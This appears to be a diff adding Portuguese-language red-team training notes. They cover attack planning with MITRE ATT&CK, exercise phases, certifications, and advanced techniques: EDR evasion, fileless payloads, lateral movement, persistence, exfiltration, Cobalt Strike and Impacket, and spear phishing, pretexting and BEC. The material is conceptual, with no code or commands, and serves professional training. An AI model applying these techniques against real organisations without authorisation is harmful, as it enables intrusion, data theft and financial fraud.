+Desenvolver planos de ataque estruturados e alinhados a frameworks reconhecidos como MITRE ATT&CK permite ao Red Team executar operações mais eficazes, organizadas e com foco nas ameaças reais.
+
+---
+
+ 🧠 Objetivos da prática
+
+```
+
+- Planejar ataques com base em técnicas e táticas conhecidas  
+- Garantir que as ações estejam alinhadas a padrões da indústria  
+- Facilitar a comunicação e documentação dos ataques  
+- Aprimorar a capacidade de simular cenários reais de ameaça  
+
+---
+
+ 🧱 Passos para criar um plano de ataque
+
+```
+
+1. **Definir objetivo do ataque:** escopo, metas e restrições  
+2. **Selecionar framework:** MITRE ATT&CK, Cyber Kill Chain, etc.  
+3. **Mapear táticas e técnicas relevantes:** escolha as que melhor se aplicam ao cenário  
+4. **Detalhar métodos e ferramentas:** ferramentas, exploits e scripts a serem usados  
+5. **Planejar sequência de ações:** fases do ataque organizadas cronologicamente  
+6. **Estabelecer métricas de sucesso:** critérios para avaliar a eficácia do ataque  
+
+---
+
+ 🔍 Dicas para Red Team N2
+
+```
+
+- Use o MITRE ATT&CK Navigator para visualizar e organizar técnicas  
+- Mantenha o plano flexível para adaptar-se a mudanças durante o teste  
+- Documente cada etapa para facilitar análise e relatório posterior  
+- Considere controles e defesas conhecidas para melhorar a evasão  
+
+---
+
+ ✅ Benefícios da prática
+
+```
+
+- Maior organização e clareza nas operações ofensivas  
+- Simulações mais realistas e alinhadas a ameaças atuais  
+- Melhora na comunicação com equipes internas e clientes  
+- Facilita análise pós-teste e identificação de melhorias  
+
+---
+
+ ✅ Conclusão
+
+Criar planos de ataque alinhados a frameworks é uma prática essencial para o Red Team N2, elevando a qualidade, eficiência e impacto das avaliações ofensivas.
+
+---
+
+ 🔴 Red Team N2: Realizar Exercício Completo de Red Team (Reconhecimento a Relatório)
+
+Conduzir um exercício completo de Red Team é fundamental para praticar todas as fases do ciclo ofensivo, desde o reconhecimento inicial até a entrega do relatório final, aprimorando habilidades técnicas e de comunicação.
+
+---
+
+ 🧠 Objetivos do exercício
+
+```
+
+- Executar todas as etapas de um ataque simulado controlado  
+- Identificar vulnerabilidades, explorar falhas e coletar evidências  
+- Documentar descobertas com clareza e precisão  
+- Desenvolver habilidades para apresentar resultados técnicos e executivos  
+
+---
+
+ 🧱 Etapas do exercício completo
+
+```
+
+1. **Planejamento e escopo:** definir metas, regras e limites  
+2. **Reconhecimento:** coletar informações públicas e passivas do alvo  
+3. **Enumeração:** identificar portas, serviços, usuários e sistemas  
+4. **Exploração:** utilizar vulnerabilidades para acesso inicial  
+5. **Pós-exploração:** movimentação lateral, escalonamento e coleta de dados  
+6. **Limpeza:** remoção de artefatos e rastros do ataque  
+7. **Documentação:** elaborar relatório técnico e executivo detalhado  
+8. **Apresentação:** comunicar resultados para stakeholders  
+
+---
+
+ 🔍 Dicas para Red Team N2
+
+```
+
+- Use ferramentas automáticas e manuais para complementar o trabalho  
+- Documente cada etapa em tempo real para evitar perda de informações  
+- Trabalhe em equipe para simular cenários reais com múltiplas frentes  
+- Prepare planos de contingência para imprevistos durante o exercício  
+
+---
+
+ ✅ Benefícios do exercício completo
+
+```
+
+- Consolida conhecimentos técnicos e estratégicos  
+- Melhora a capacidade de planejamento e execução de ataques reais  
+- Desenvolve habilidades de documentação e comunicação profissional  
+- Ajuda a identificar pontos fortes e áreas de melhoria pessoal  
+
+---
+
+ ✅ Conclusão
+
+Realizar exercícios completos de Red Team prepara o profissional para enfrentar desafios reais com confiança, técnica apurada e comunicação eficaz, entregando valor para a segurança organizacional.
+
+---
+
+ 🔴 Red Team N2: Planejar Próximos Passos para Especialização (ex: Certificações OSCP, CRTP)
+
+Planejar a evolução profissional com foco em especialização ajuda o Red Team N2 a alcançar níveis mais avançados, consolidar conhecimentos e abrir portas para oportunidades de carreira.
+
+---
+
+ 🧠 Por que planejar a especialização?
+
+```
+
+- Direciona esforços para objetivos claros e alcançáveis  
+- Ajuda a organizar estudos e práticas de forma eficiente  
+- Valida conhecimentos técnicos com certificações reconhecidas  
+- Melhora o currículo e a reputação profissional  
+
+---
+
+ 🧱 Certificações recomendadas para Red Team N2
+
+```
+
+ OSCP (Offensive Security Certified Professional)
+
+- Foco em testes de penetração práticos e avançados  
+- Reconhecida mundialmente na comunidade de segurança ofensiva  
+- Requer domínio de técnicas de exploração, pós-exploração e scripting  
+
+ CRTP (Certified Red Team Professional)
+
+- Especialização em ataques e persistência em ambientes Windows  
+- Foco em técnicas avançadas de Active Directory e movimentação lateral  
+- Ideal para quem deseja atuar com Red Team mais especializado  
+
+ Outras certificações relevantes
+
+- CEH (Certified Ethical Hacker)  
+- eCPPT (eLearnSecurity Certified Professional Penetration Tester)  
+- OSWE (Offensive Security Web Expert)  
+
+---
+
+ 🔍 Como planejar seus estudos
+
+```
+
+- Avalie seu nível atual e áreas que precisam de reforço  
+- Defina um cronograma realista com metas semanais e mensais  
+- Combine teoria, prática em laboratórios e simulações reais  
+- Utilize cursos, materiais oficiais, vídeos e comunidades técnicas  
+- Faça revisões periódicas e participe de grupos de estudo  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Priorize certificações que agreguem valor ao seu objetivo profissional  
+- Pratique muito em laboratórios e máquinas virtuais (ex: Hack The Box, TryHackMe)  
+- Documente seu progresso e dificuldades para ajustar o plano  
+- Busque feedback de mentores e colegas experientes  
+
+---
+
+ ✅ Conclusão
+
+Planejar os próximos passos para especialização permite ao Red Team N2 crescer com foco, disciplina e confiança, ampliando sua atuação e relevância no mercado de segurança ofensiva.
+
+---
+
+ 🔴 Red Team N3: Recapitulação Profunda de Técnicas de Reconhecimento, Exploração e Pós-Exploração
+
+No nível N3, o Red Team domina técnicas avançadas para conduzir ataques sofisticados, cobrindo desde o reconhecimento inicial até a pós-exploração detalhada, garantindo máxima eficácia e discrição.
+
+---
+
+ 🧠 Reconhecimento Avançado
+
+```
+
+- **Reconhecimento passivo e ativo:** coleta detalhada de informações via OSINT, análise de redes sociais, DNS, e varreduras específicas  
+- **Enumeração profunda:** mapeamento minucioso de hosts, serviços, usuários, grupos e permissões usando ferramentas como `nmap`, `enum4linux`, `ldapsearch`  
+- **Coleta de credenciais:** phishing direcionado, captura de hashes via SMB/NetNTLM, e análise de arquivos públicos  
+
+---
+
+ 🧱 Exploração Avançada
+
+```
+
+- **Exploits customizados e zero-days:** desenvolvimento e uso de exploits sob medida para vulnerabilidades específicas  
+- **Bypass de controles de segurança:** evasão de AV/EDR, bypass de proteção de memória (DEP, ASLR) e exploração de falhas em sistemas de detecção  
+- **Execução de payloads avançados:** uso de técnicas como DLL injection, reflective loading e execução viva em memória (fileless)  
+
+---
+
+ 🔍 Pós-Exploração Profunda
+
+```
+
+- **Escalonamento de privilégios:** exploração de vulnerabilidades locais, abuso de permissões e credenciais armazenadas  
+- **Movimentação lateral sofisticada:** uso de Pass-the-Hash, Pass-the-Ticket, RDP, WMI, PSExec e PowerShell Remoting  
+- **Persistência avançada:** criação de backdoors stealth, abusos de serviços, scheduled tasks e técnicas de living-off-the-land (LOLbins)  
+- **Coleta e exfiltração de dados:** identificação de dados sensíveis, compressão, criptografia e transferência segura para servidores externos  
+
+---
+
+ ⚙️ Boas práticas para Red Team N3
+
+```
+
+- Planeje ataques com base em inteligência atualizada e contexto do alvo  
+- Documente minuciosamente todas as etapas e técnicas utilizadas  
+- Teste evasões contra as ferramentas de defesa específicas do ambiente  
+- Coordene a comunicação com Blue Team para exercícios de adversary emulation  
+
+---
+
+ ✅ Conclusão
+
+A recapitulação profunda das técnicas de reconhecimento, exploração e pós-exploração consolida o conhecimento avançado do Red Team N3, elevando o nível das operações ofensivas e a capacidade de impactar ambientes reais.
+
+---
+
+ 🔴 Red Team N3: Ferramentas Avançadas – Cobalt Strike, BloodHound, Impacket
+
+No nível N3, o Red Team utiliza ferramentas avançadas que permitem executar ataques sofisticados, facilitar a movimentação lateral, a escalada de privilégios e o mapeamento detalhado do ambiente.
+
+---
+
+ 🧠 Cobalt Strike
+
+```
+
+- Plataforma comercial para simular ataques adversários (adversary emulation)  
+- Permite criação e gerenciamento de *beacons* para controle remoto de hosts comprometidos  
+- Suporta técnicas avançadas de pós-exploração, evasão e movimentação lateral  
+- Integração com ferramentas de scripting para customização e automação de ataques  
+- Amplamente usado para exercícios de Red Team e pen tests avançados  
+
+🔗 [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)
+
+---
+
+ 🧱 BloodHound
+
+```
+
+- Ferramenta de análise e visualização de relações e permissões no Active Directory  
+- Ajuda a identificar caminhos de escalonamento de privilégios e movimentos laterais possíveis  
+- Baseia-se na coleta de dados via scripts PowerShell e consultas LDAP  
+- Facilita planejamento de ataques mais eficientes contra ambientes Windows corporativos  
+
+🔗 [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+---
+
+ 🔍 Impacket
+
+```
+
+- Biblioteca Python para criação de scripts e ferramentas de rede e segurança  
+- Suporta protocolos como SMB, MSRPC, LDAP, Kerberos, entre outros  
+- Permite execução de exploits, movimentação lateral e coleta de informações via scripts customizados  
+- Base para muitas ferramentas e exploits usados em Red Team e pentests  
+
+🔗 [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+
+---
+
+ ⚙️ Dicas para Red Team N3
+
+```
+
+- Combine o uso dessas ferramentas para maximizar o impacto das operações  
+- Estude profundamente as funcionalidades e técnicas suportadas por cada ferramenta  
+- Pratique em laboratórios controlados para dominar integração e workflow  
+- Esteja atento a atualizações e novas técnicas para evitar detecção  
+
+---
+
+ ✅ Conclusão
+
+Dominar Cobalt Strike, BloodHound e Impacket coloca o Red Team N3 em um patamar elevado, habilitando ataques sofisticados, planejamento preciso e execução eficiente em ambientes corporativos.
+
+---
+
+ 🔴 Red Team N3: Análise de Casos Reais de Ataques Sofisticados
+
+Estudar casos reais de ataques sofisticados permite ao Red Team N3 entender técnicas avançadas, táticas utilizadas por adversários reais e aprimorar estratégias ofensivas e defensivas.
+
+---
+
+ 🧠 Por que analisar casos reais?
+
+```
+
+- Aprender com falhas e sucessos de ataques reais  
+- Identificar padrões e técnicas emergentes  
+- Melhorar a capacidade de detecção, resposta e mitigação  
+- Inspirar cenários para exercícios de Red Team e Blue Team  
+
+---
+
+ 🧱 Exemplos de ataques sofisticados
+
+```
+
+ 1. SolarWinds (2020)
+
+- Acesso inicial via comprometimento da cadeia de suprimentos  
+- Uso de backdoors e técnicas de evasão para infiltração prolongada  
+- Movimentação lateral e exfiltração de dados sensíveis  
+- Impacto global em múltiplas organizações governamentais e privadas  
+
+ 2. APT29 / Cozy Bear
+
+- Campanhas de espionagem com técnicas avançadas de spear phishing  
+- Uso de malware customizado e ferramentas de pós-exploração sofisticadas  
+- Persistência oculta e comunicação via canais cifrados  
+
+ 3. WannaCry Ransomware (2017)
+
+- Exploração da vulnerabilidade SMB EternalBlue para rápida propagação  
+- Criptografia massiva de dados e demanda de resgate financeiro  
+- Impacto global em múltiplas indústrias e serviços públicos  
+
+---
+
+ 🔍 Lições aprendidas
+
+```
+
+- A importância da segmentação e defesa em profundidade  
+- Necessidade de monitoramento contínuo e análise comportamental  
+- Valor da resposta rápida e coordenação entre equipes de segurança  
+- Atenção especial a vetores de ataque emergentes e cadeia de suprimentos  
+
+---
+
+ ⚙️ Aplicação para Red Team N3
+
+```
+
+- Desenvolver cenários de ataque baseados em casos reais para treinamentos  
+- Ajustar técnicas e ferramentas conforme as táticas observadas  
+- Colaborar com Blue Team para melhorar detecção e resposta  
+- Documentar e compartilhar conhecimento para fortalecimento da equipe  
+
+---
+
+ ✅ Conclusão
+
+Analisar ataques sofisticados reais é essencial para que o Red Team N3 se mantenha atualizado, preparado e apto a enfrentar ameaças complexas no mundo real, aumentando o valor das operações ofensivas.
+
+---
+
+ 🔴 Red Team N3: Prática – Laboratórios com Ambientes Complexos e Múltiplas Camadas de Defesa
+
+Treinar em laboratórios realistas e desafiadores é fundamental para o Red Team N3 desenvolver habilidades para enfrentar ambientes corporativos sofisticados, com defesas em múltiplas camadas.
+
+---
+
+ 🧠 Objetivos da prática
+
+```
+
+- Aprender a identificar e superar defesas complexas e múltiplas camadas  
+- Desenvolver estratégias de ataque coordenadas e furtivas  
+- Exercitar técnicas avançadas de evasão, movimentação lateral e persistência  
+- Preparar para ambientes reais com controles de segurança robustos  
+
+---
+
+ 🧱 Características de ambientes complexos
+
+```
+
+- Segmentação de rede rigorosa e firewalls internos  
+- Soluções avançadas de detecção (EDR, IPS, SIEM)  
+- Políticas de acesso restritas e monitoração constante  
+- Sistemas heterogêneos (Windows, Linux, cloud) integrados  
+
+---
+
+ 🔍 Como estruturar o laboratório
+
+```
+
+- Utilize ferramentas como VMware, VirtualBox ou ambientes em nuvem para criar infraestruturas  
+- Configure múltiplas VLANs, firewalls e gateways para simular segmentação  
+- Instale e configure soluções de segurança como EDR, SIEM e IDS/IPS  
+- Simule usuários e tráfego normal para dificultar a detecção  
+
+---
+
+ ⚙️ Dicas para Red Team N3
+
+```
+
+- Planeje ataques multi-fase considerando defesas em cada camada  
+- Documente as técnicas de evasão e ferramentas usadas em cada etapa  
+- Experimente diferentes vetores e abordagens para contornar controles  
+- Analise logs e alertas para entender o que foi detectado e melhorar táticas  
+
+---
+
+ ✅ Benefícios da prática
+
+```
+
+- Melhora significativa na capacidade de realizar ataques furtivos e eficazes  
+- Maior familiaridade com ambientes complexos e variados  
+- Desenvolvimento de pensamento estratégico e adaptativo  
+- Preparação para desafios reais em ambientes corporativos de alta segurança  
+
+---
+
+ ✅ Conclusão
+
+Laboratórios com ambientes complexos e múltiplas camadas de defesa são essenciais para o Red Team N3 aprimorar suas habilidades, preparando-se para operações avançadas e ambientes corporativos exigentes.
+
+---
+
+ 🔴 Red Team N3: Técnicas Avançadas de Spear Phishing, Pretexting e BEC (Business Email Compromise)
+
+No nível N3, o Red Team domina técnicas sofisticadas de engenharia social para comprometer alvos específicos, explorando a confiança e vulnerabilidades humanas em ambientes corporativos.
+
+---
+
+ 🧠 Por que dominar essas técnicas?
+
+```
+
+- Spear phishing e BEC são vetores comuns e eficazes para acesso inicial  
+- Permitem infiltração furtiva e direcionada em organizações  
+- Exploram falhas humanas difíceis de detectar por defesas técnicas  
+- Possibilitam ataques com alto impacto financeiro e estratégico  
+
+---
+
+ 🧱 Técnicas avançadas de Spear Phishing
+
+```
+
+- **Pesquisa detalhada:** coleta de informações via OSINT para criar mensagens altamente personalizadas  
+- **Email spoofing e comprometimento de contas:** uso de domínios falsificados ou contas legítimas para aumentar credibilidade  
+- **Anexos e links maliciosos:** criação de payloads indetectáveis e páginas de phishing customizadas  
+- **Timing estratégico:** envio em momentos críticos para aumentar chance de sucesso  
+
+---
+
+ 🔍 Pretexting sofisticado
+
+```
+
+- Construção de histórias convincentes que justificam pedidos ou ações  
+- Uso de identidades falsas com informações reais para enganar a vítima  
+- Abordagem multicanal (telefone, email, redes sociais) para reforçar o pretexto  
+- Exploração de hierarquia organizacional para ganhar acesso privilegiado  
+
+---
+
+ ⚙️ Business Email Compromise (BEC)
+
+```
+
+- Comprometimento de contas de email corporativas para solicitações financeiras fraudulentas  
+- Monitoramento de comunicações para entender processos e relações internas  
+- Manipulação de solicitações de pagamento, transferências e dados confidenciais  
+- Uso de técnicas para evitar detecção, como redação formal e uso de contatos reais  
+
+---
+
+ ✅ Boas práticas para Red Team N3
+
+```
+
+- Realize simulações éticas com autorização e escopo definidos  
+- Combine técnicas técnicas e sociais para maior eficácia  
+- Monitore indicadores de sucesso e falha para aprimorar abordagens  
+- Documente processos e resultados para treinamento e aprendizado contínuo  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas avançadas de spear phishing, pretexting e BEC coloca o Red Team N3 em posição de simular ameaças reais de alta complexidade, preparando organizações para defender-se contra ataques sofisticados.
+
+---
